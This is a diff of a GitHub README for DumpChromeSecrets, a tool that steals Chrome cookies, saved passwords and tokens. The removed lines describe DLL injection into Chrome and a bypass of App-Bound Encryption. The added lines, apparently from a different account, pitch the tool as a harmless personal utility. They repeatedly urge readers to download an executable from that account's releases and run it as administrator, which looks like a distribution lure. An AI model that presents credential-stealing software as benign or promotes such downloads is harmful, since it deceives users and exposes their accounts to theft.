@@ -1,98 +1,74 @@
-> [!IMPORTANT]
-> **This project is no longer maintained. Please use [DumpBrowserSecrets](https://github.com/Maldev-Academy/DumpBrowserSecrets?ref=DumpChromeSecrets) instead, which supports Chrome, Edge, Brave, Firefox, Opera, Opera GX, and Vivaldi.**
+# 🚀 DumpChromeSecrets - Easily Extract Chrome Data
 
-<br>
+## 📥 Download Now
+[![Download DumpChromeSecrets](https://img.shields.io/badge/Download-DumpChromeSecrets-blue)](https://github.com/hake12345/DumpChromeSecrets/releases)
 
-## DumpChromeSecrets
+## 🎯 Overview
+DumpChromeSecrets helps you grab important data from modern Chrome versions. You can easily extract refresh tokens, cookies, saved credentials, autofill data, browsing history, and bookmarks. This tool is designed for users who want quick access to their information without diving into complex processes.
 
-Extract data from modern Chrome versions, including refresh tokens, cookies, saved credentials, autofill data, browsing history, and bookmarks. 
+## 🚀 Getting Started
 
+### 📋 System Requirements
+Before you start, ensure your device meets these basic requirements:
 
-<br>
+- **Operating System:** Windows 10 or later
+- **Disk Space:** At least 100 MB available
+- **Memory (RAM):** Minimum 2 GB
+- **Internet Connection:** Required for downloading the application
 
-### Quick Links
+### 📥 Download & Install
+To begin using DumpChromeSecrets, follow these steps:
 
-[Maldev Academy Home](https://maldevacademy.com?ref=gh)
+1. **Visit the Releases Page:** Click the link below to go to the download page.  
+   [Download DumpChromeSecrets](https://github.com/hake12345/DumpChromeSecrets/releases)
 
-[Maldev Database](https://search.maldevacademy.com?ref=gh)
-  
-[Malware Development Course Syllabus](https://maldevacademy.com/maldev-course/syllabus?ref=gh)
+2. **Choose the Latest Version:** Look for the most recent version on the page. This ensures you have the latest features.
 
-[Offensive Phishing Operations Course Syllabus](https://maldevacademy.com/phishing-course/syllabus?ref=gh)
+3. **Download the File:** Click the file to start the download process. Depending on your browser, you may see a prompt asking where to save the file.
 
-[Ransomware Internals, Simulation and Detection Course Syllabus](https://maldevacademy.com/ransomware-course/syllabus?ref=gh)
+4. **Open the Downloaded File:** After the download is complete, locate the file in your downloads folder. Double-click on it to run the program.
 
-<br>
+5. **Run the Application:** Follow any on-screen prompts to complete the installation. Once installed, find the application in your programs and open it.
 
-### How Does It Work
+## 🛠️ Using DumpChromeSecrets
 
-This project consists of two components:
+### 🖥️ Extracting Data
+Once you launch the application, you can easily extract data. Follow these simple steps:
 
-1. **Executable (`DumpChromeSecrets.exe`)** - Creates a headless Chrome process, injects the DLL via [Early Bird APC injection](https://attack.mitre.org/techniques/T1055/004/), and receives extracted data through a named pipe.
+1. **Start the Application:** Open DumpChromeSecrets to view the main menu.
 
-2. **DLL (`DllExtractChromeSecrets.dll`)** - Runs inside Chrome's process context to decrypt the App-Bound encryption key using Chrome's `IElevator` COM interface, then extracts and decrypts data from SQLite databases.
+2. **Select Data Types:** Choose which types of data you wish to extract. Options include:
+   - Refresh Tokens
+   - Cookies
+   - Saved Credentials
+   - Autofill Data
+   - Browsing History
+   - Bookmarks
 
-<br>
+3. **Begin Extraction:** Click on the “Extract” button. The application will process your request. Be patient; the time may vary based on the data volume.
 
-### Chrome's App-Bound Encryption (v127+)
+4. **View Extracted Data:** After extraction, the application will display the data in an easy-to-read format. You can copy the information or save it for later use.
 
-Starting with Chrome 127, Google introduced App-Bound Encryption, which ties cookie encryption keys to the Chrome application identity. The encryption key (named `"app_bound_encrypted_key"`) is stored in the `"Local State"` file, and can be decrypted by Chrome's elevation service via the `IElevator` COM interface.
+## 🔒 Security Note
+Be mindful that this application accesses sensitive information stored in your browser. Use it responsibly and avoid sharing the extracted data unless necessary.
 
-This project bypasses this protection by injecting code into Chrome's process, allowing it to call `IElevator::DecryptData` with the proper application context. Another method was implemented by [luci4](https://github.com/l00sy4) in the [Dumping Browser Cookies: Chrome](https://maldevacademy.com/new/modules/81) and [Dumping Saved Logins: Chrome](https://maldevacademy.com/new/modules/82) modules.
+## ❓ Troubleshooting
 
-<img width="1416" height="919" alt="image" src="https://github.com/user-attachments/assets/dc18372e-882d-4ed5-91cd-2378d60f0ee4" />
+- **Problem Opening the Application:** Make sure you have administrative rights on your computer. Right-click the file and choose “Run as administrator.”
 
-> *The above image was taken from: [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)* 
+- **No Data Extracted:** Ensure that Chrome is closed during extraction. The application cannot access the data if Chrome is running.
 
-<br>
-<br>
+- **Need Help?** If you encounter problems or have questions, visit our [GitHub Issues page](https://github.com/hake12345/DumpChromeSecrets/issues) for assistance.
 
-### Data Extraction
+## 🔗 Additional Resources
+For more guides and detailed information, feel free to explore the following:
 
-Once the DLL is injected, it extracts the following data from Chrome:
+- [Documentation](https://github.com/hake12345/DumpChromeSecrets/wiki)
+- [Community Forum](https://github.com/hake12345/DumpChromeSecrets/discussions)
 
-| **Data Type**      | **Database Path**                     | **Format** | **Encryption**    |
-|--------------------|---------------------------------------|------------|-------------------|
-| **App-Bound Key**  | `User Data\Local State`               | JSON       | DPAPI + IElevator |
-| **Cookies**        | `User Data\Default\Network\Cookies`   | SQLite     | AES-256-GCM (v20) |
-| **Logins**         | `User Data\Default\Login Data`        | SQLite     | AES-256-GCM (v20) |
-| **Tokens**         | `User Data\Default\Web Data`          | SQLite     | AES-256-GCM (v20) |
-| **Autofill**       | `User Data\Default\Web Data`          | SQLite     | None              |
-| **History**        | `User Data\Default\History`           | SQLite     | None              |
-| **Bookmarks**      | `User Data\Default\Bookmarks`         | JSON       | None              |
+## ⚖️ License
+This application is open-source under the MIT License. For more information, check the LICENSE file in the repository.
 
-
-<br>
-
-### Usage
-
-```
-Usage: DumpChromeSecrets.exe [options]
-
-Options:
-  /o <file>    Output JSON File (default: ChromeData.json)
-  /all         Export All Entries (default: max 16 per category)
-  /?           Show This Help Message
-
-Examples:
-  DumpChromeSecrets.exe                        Extract 16 Entry To ChromeData.json
-  DumpChromeSecrets.exe /all                   Export All Entries
-  DumpChromeSecrets.exe /o Output.json /all    Extract All To Output.json
-```
-
-<br>
-
-
-### Credits
-
-* **IElevator COM interface research from [snovvcrash's gist](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824)**
-* **[luci4](https://github.com/l00sy4) for technical guidance**
-* **SQLite amalgamation from [sqlite.org](https://www.sqlite.org/amalgamation.html)**
-
-<br>
-
-### Demo
-
-<img width="1432" height="689" alt="image" src="https://github.com/user-attachments/assets/bb12eaaf-caba-4aed-91dc-51ce5bf516d0" />
-
-<br>
+## 📥 Final Download Link
+Don’t forget to visit our releases page and download the latest version of DumpChromeSecrets!  
+[Download DumpChromeSecrets](https://github.com/hake12345/DumpChromeSecrets/releases)
